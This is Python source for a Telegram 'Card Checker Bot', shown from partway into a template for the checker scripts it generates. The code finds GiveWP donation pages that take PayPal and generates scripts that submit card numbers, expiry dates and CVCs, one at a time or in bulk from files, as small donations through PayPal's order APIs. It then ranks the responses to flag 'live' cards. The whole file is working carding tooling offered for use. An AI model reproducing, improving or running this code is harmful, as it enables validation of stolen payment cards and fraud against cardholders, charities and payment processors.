                headers=he, data=da, timeout=15)
            j = r3_raw.json()
            if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                return j['data']['id'], None
            return None, str(j.get('data', {{}}).get('error', 'fail'))[:200]
        except Exception as e:
            if r3_raw is not None:
                return None, r3_raw.text[:150]
            return None, f"Exception: {{str(e)[:100]}}"

    def _try_confirm(self, order_id, n, mm, yy, cvc):
        expiry = f"20{{yy}}-{{mm}}"
        metadata = PAYPAL_META or CLIENT_ID or ''
        he4 = {{
            'authorization': f'Bearer {{ACCESS_TOKEN}}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        try:
            cr = self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                headers=he4, json=da3, timeout=15)
            return cr.text
        except:
            return ""

    def _try_approve(self, order_id, amt, currency, pid):
        fields = {{
            'give-form-id-prefix': (None, ID_FORM1),
            'give-form-id': (None, ID_FORM2),
            'give-form-hash': (None, NONCE),
            'give-amount': (None, amt),
            'give-currency': (None, currency),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }}
        if pid is not None:
            fields['give-price-id'] = (None, pid)

        da4 = MultipartEncoder(fields)
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        try:
            r5 = self.r.post(AJAX_URL,
                params={{'action': 'give_paypal_commerce_approve_order', 'order': order_id}},
                headers=he5, data=da4, timeout=15)
            return r5.text, he5, da4
        except:
            return "", {{}}, None

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        if not luhn_check(n):
            return "INVALID_CARD_NUMBER"

        price_ids = ['custom', '3', '4', '', None]
        if CURRENT_PID and CURRENT_PID not in price_ids:
            price_ids.insert(0, CURRENT_PID)

        attempts = ["1.00", "5.00"]
        try:
            min_val = float(MINIMUM)
            if min_val > 1.0 and f"{{min_val:.2f}}" not in attempts:
                attempts.append(f"{{min_val:.2f}}")
        except: pass

        all_results = []
        create_errors = []

        for amt in attempts:
            self.donation = amt
            order_id = None
            last_err = ""

            for pid in price_ids:
                oid, err = self._try_create_order(amt, CURRENCY, pid)
                if oid:
                    order_id = oid
                    break
                else:
                    last_err = err

            if not order_id:
                create_errors.append((amt, last_err))
                continue

            confirm_body = self._try_confirm(order_id, n, mm, yy, cvc)

            for pid in price_ids:
                approve_text, he5, da4 = self._try_approve(order_id, amt, CURRENCY, pid)
                text = approve_text + confirm_body

                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {{amt}}$'

                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        if kw in ('ORDER_NOT_APPROVED', 'PAYER_CANNOT_PAY', 'PayPal orders are captured'):
                            return "Payer cannot pay for this transaction."
                        return kw

                try:
                    import json as _json
                    err = str(_json.loads(approve_text)['data']['error'])[:200] if approve_text else ""
                    if err and err != "None":
                        all_results.append({{'amount': amt, 'result': err}})
                        break
                except: pass

        if all_results:
            PRIORITY = [
                ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
                ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
                ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
                ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
                ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
                ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
                ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
                ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
                ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153), ('DECLINED', 100),
            ]
            def score(r):
                up = r['result'].upper()
                for k, s in PRIORITY:
                    if k.upper() in up:
                        return s
                return 1
            best = max(all_results, key=score)
            res = best['result']
            self.donation = best['amount']
            if 'ORDER_NOT_APPROVED' in res.upper() or 'PAYER_CANNOT_PAY' in res.upper():
                return "Payer cannot pay for this transaction."
            return res

        if create_errors:
            return create_errors[-1][1]

        return "No response from server"


def single_check():
    print("\\n--- Single Card ---")
    card = input("Card (num|mm|yy|cvc): ").strip()
    if not card:
        return
    p = PayPal()
    print("Response:", p.Charge(card))


def file_check():
    print("\\n--- File Check ---")
    path = input("File path: ").strip()
    import os
    if not os.path.exists(path):
        print("Not found")
        return
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [l.strip() for l in f if l.strip()]
    if not cards:
        return
    out = f"results_{{int(time.time())}}.txt"
    with open(out, 'w', encoding='utf-8') as fo:
        for i, c in enumerate(cards, 1):
            p = PayPal()
            res = p.Charge(c)
            line = f"{{c}} => {{res}}"
            print(f"[{{i}}/{{len(cards)}}] {{line}}")
            fo.write(line + "\\n"); fo.flush()
            time.sleep(1)
    print("Saved:", out)


def main():
    print("=" * 60)
    print(f"  Live Gateway — {{PREFERRED_AMT}} {{CURRENCY}}")
    print(f"  Token  : {{ACCESS_TOKEN[:40] if ACCESS_TOKEN else 'N/A'}}")
    print(f"  Form   : {{ID_FORM2}} ({{ID_FORM1}})")
    print("=" * 60)
    while True:
        print("\\n[1] Single  [2] File  [0] Exit")
        c = input("Choose: ").strip()
        if c == '1':
            single_check()
        elif c == '2':
            file_check()
        elif c == '0':
            break


if __name__ == '__main__':
    main()
'''


# ============================================================
#  BOT HANDLERS
# ============================================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    save_user(massege.from_user.id)
    if is_blocked(massege.from_user.id):
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return
    chat_id = massege.chat.id
    ko = safe_send_message(chat_id, "- The gate is being withdrawn ...")
    if not ko: return
    time.sleep(1)

    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(chat_id, ko.message_id,
                '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return
        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(chat_id, ko.message_id, "Invalid link format ❌")
            return
        time.sleep(1)
        safe_edit_message(chat_id, ko.message_id, "Gate found ✅")
    except: pass

    try:
        tester = PayPalTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD)
        print(f"[paypal] result: {result} | amount: {tester.donation} | currency: {tester.currency}")

        if not is_live_response(result):
            safe_edit_message(chat_id, ko.message_id,
                f"❌ <b>Not Live</b>\n🔗 <code>{link}</code>\n\n"
                f"📝 <b>Response:</b> <code>{result}</code>\n"
                f"💱 <b>Currency:</b> <code>{tester.currency}</code>")
            return

        try:
            code = generate_gateway_code(result, link, tester.donation, tester)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id, f"❌ Code gen error: {str(e)[:200]}")
            return

        file_name = f'gateway_{int(time.time())}.py'
        try:
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(code)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id, f"❌ File write error: {str(e)[:200]}")
            return

        if 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
            display = "Payer cannot pay for this transaction."
        else:
            display = result

        caption = f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{display}</code>
💰 <b>Amount:</b> <code>${tester.donation}</code>
💱 <b>Currency:</b> <code>{tester.currency}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30'''

        sent = safe_send_document(chat_id, file_name, caption=caption)
        if not sent:
            safe_send_message(chat_id,
                f"⚠️ File could not be sent:\n\n{caption}\n\n"
                f"📁 Size: {len(code)} bytes")

        try: os.remove(file_name)
        except: pass

    except Exception as e:
        import traceback; traceback.print_exc()
        safe_edit_message(chat_id, ko.message_id, f"❌ Error: {str(e)[:200]}")


@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    save_user(message.from_user.id)
    if is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]
        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return
        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
🛑 /stop to stop""")
        if not status_msg: return

        def update_status():
            last_text = ""
            while True:
                time.sleep(8)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False): break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        cur_url = processing_status[user_id]['current_url']
                        cur_res = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{cur_url[:60] if cur_url else '...'}</code>
Respons : <code>{cur_res[:60] if cur_res else '...'}</code>
━━━━━━━━━━━━━━━━━━
🛑 /stop to stop"""
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except: pass
                except: pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        time.sleep(1)
        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False): break
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            result = check_single_link(link)
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    try:
                        tester = result.get('tester')
                        code = generate_gateway_code(result['respons'], result['link'], result.get('amount', '1.00'), tester)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        display = result['respons']
                        if 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
                            display = "Payer cannot pay for this transaction."
                        cur = tester.currency if tester else 'USD'
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{display}</code>
💰 <b>Amount:</b> <code>${result.get('amount', '1.00')}</code>
💱 <b>Currency:</b> <code>{cur}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30""")
                        try: os.remove(file_name)
                        except: pass
                    except Exception as e: print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            time.sleep(1)
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        updater.join(timeout=10)
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except: safe_send_message(chat_id, final_text)
        if user_id in processing_status:
            del processing_status[user_id]
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")


# ============================================================
#  START / FEEDBACK / ADMIN
# ============================================================
@bot.message_handler(commands=["start"])
def start(message):
    save_user(message.from_user.id)
    if is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"
    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    safe_send_message(message.chat.id, IU, reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=f'Welcome {userr} Send your message.', parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    text = message.text or "(non-text message)"
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    text = message.text or "(non-text message)"
    safe_send_message(user_id, f"Admin response:\n\n{text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id, None)


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'[⚡] Welcome {userr}\n[⚡] @{username}\n[⚡] ID: <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")


@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        with open('blockusers.txt', 'r') as file:
            blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
        if uid in blocked:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is already blocked.")
            return
        with open('blockusers.txt', 'a') as file:
            file.write(f"{uid}\n")
        safe_send_message(message.chat.id, f"✅ User ID {uid} blocked.")
        try:
            safe_send_message(int(uid), "🚫 You have been blocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        found = any(line.strip() == uid for line in lines)
        if not found:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is not blocked.")
            return
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != uid:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {uid} unblocked.")
        try:
            safe_send_message(int(uid), "✅ You have been unblocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


@bot.message_handler(commands=['blocklist'])
def block_list(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    with open('blockusers.txt', 'r') as file:
        blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
    if not blocked:
        safe_send_message(message.chat.id, "📋 Block list is empty.")
        return
    text = "📋 <b>Blocked Users:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, uid in enumerate(blocked, 1):
        text += f"{i}. <code>{uid}</code>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n📌 Total: <b>{len(blocked)}</b>"
    safe_send_message(message.chat.id, text)


print('✅ Bot is running...')
try:
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
